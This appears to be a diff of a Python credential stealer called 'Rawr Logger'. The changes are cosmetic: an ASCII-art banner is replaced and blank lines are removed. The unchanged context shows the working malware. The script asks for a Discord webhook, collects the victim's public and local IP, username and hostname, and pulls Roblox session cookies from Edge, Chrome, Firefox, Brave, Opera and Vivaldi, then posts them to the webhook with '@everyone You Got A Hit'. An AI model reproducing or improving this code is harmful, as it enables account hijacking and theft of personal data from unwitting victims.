@@ -180,37 +180,13 @@ with open('image.png', 'rb') as f:
 os.remove('image.png')
 
 Write.Print(Center.XCenter("""
-                                          
-                                ▒▒▓▓                              
-                                ▒▒▓▓                              
-                              ░░██░░                              
-                            ░░██████░░                            
-                          ▒▒████████░░                            
-                        ▒▒██████████░░                            
-                      ████████████████▓▓                          
-                    ████████████▓▓████▒▒                          
-                  ████████████▓▓▒▒██████▓▓                        
-                ████████████▓▓▒▒▒▒██████▒▒                        
-                ████████████▓▓▒▒▓▓████████▓▓                      
-              ▒▒████████████▒▒▓▓██████████▓▓                      
-              ██████████▓▓▒▒▒▒▓▓████████████▓▓                    
-            ░░██████████▓▓▒▒▒▒▓▓████████████▓▓                    
-            ████████████▒▒▒▒▒▒████████████████                    
-            ██████████▓▓▒▒▒▒▒▒▓▓████████████████                  
-            ██████████▓▓▒▒▒▒▒▒▓▓████████████████▒▒                
-            ██████████▒▒▒▒▒▒▒▒▒▒▒▒████████████████                
-            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒████████████████                
-            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████████████                
-            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓████████████                
-            ████████▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒████████████                
-              ██████▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▓▓████████                  
-              ████████▓▓▒▒░░░░░░▒▒▒▒▒▒▓▓████████                  
-                ██████▓▓▒▒░░░░░░▒▒▒▒▒▒▓▓████████                  
-                ████████▓▓▒▒░░▒▒▒▒▒▒▓▓████████                    
-                  ████████▓▓▒▒▒▒▒▒▓▓████████                      
-                      ████████████████▓▓                          
-                  Made By Jose#0001,TheSoap1#9870                                          
-                                         
+    ____                         __                               
+   / __ \____ __      _______   / /   ____  ____ _____ ____  _____
+  / /_/ / __ `/ | /| / / ___/  / /   / __ \/ __ `/ __ `/ _ \/ ___/
+ / _, _/ /_/ /| |/ |/ / /     / /___/ /_/ / /_/ / /_/ /  __/ /    
+/_/ |_|\__,_/ |__/|__/_/     /_____/\____/\__, /\__, /\___/_/     
+                                         /____//____/             
+              Made By Jose#0001,TheSoap1#9870                                        
 """), Colors.green_to_yellow, interval=0)
 webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_yellow, interval=0.01)
 r = requests.get(webhook)
@@ -244,7 +220,6 @@ embed = {
                 {
                     "author": {
                         "name": "Rawr Logger",
-
                         "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
 "description": f" @everyone You Got A Hit```There Public Ip Is: {ips}``` ```There Computers Ip:{ip}``` ```There Pc Username Is: {pc_username}``````There Pc Host Name Is: {hostname}```",
@@ -270,7 +245,6 @@ def edge():
                     }
                 }
             ]
-
         }
         requests.post(webhook, json=embedss) 
     except:
@@ -290,7 +264,6 @@ def chromes():
                     "description": f"```Roblox Cookie Is:{cookie}```",                       
                 }
             ]
-
         }
         requests.post(webhook, json=embedss) 
     except:
@@ -310,7 +283,6 @@ def firefoxs():
                     "description": f"```Roblox Cookie Is:{cookie}```",                      
                 }
             ]
-
         }
         requests.post(webhook, json=embedss) 
     except:
@@ -330,7 +302,6 @@ def braves():
                     "description": f"```Roblox Cookie Is:{cookie}```",                       
                 }
             ]
-
         }
         requests.post(webhook, json=embedss) 
     except:
@@ -350,7 +321,6 @@ def operas():
                     "description": f"```Roblox Cookie Is:{cookie}```",                      
                 }
             ]
-
         }
         requests.post(webhook, json=embedss) 
     except:
@@ -370,7 +340,6 @@ def vivaldis():
                     "description": f"```Roblox Cookie Is:{cookie}``````",                       
                 }
             ]
-
         }
         requests.post(webhook, json=embedss) 
     except:
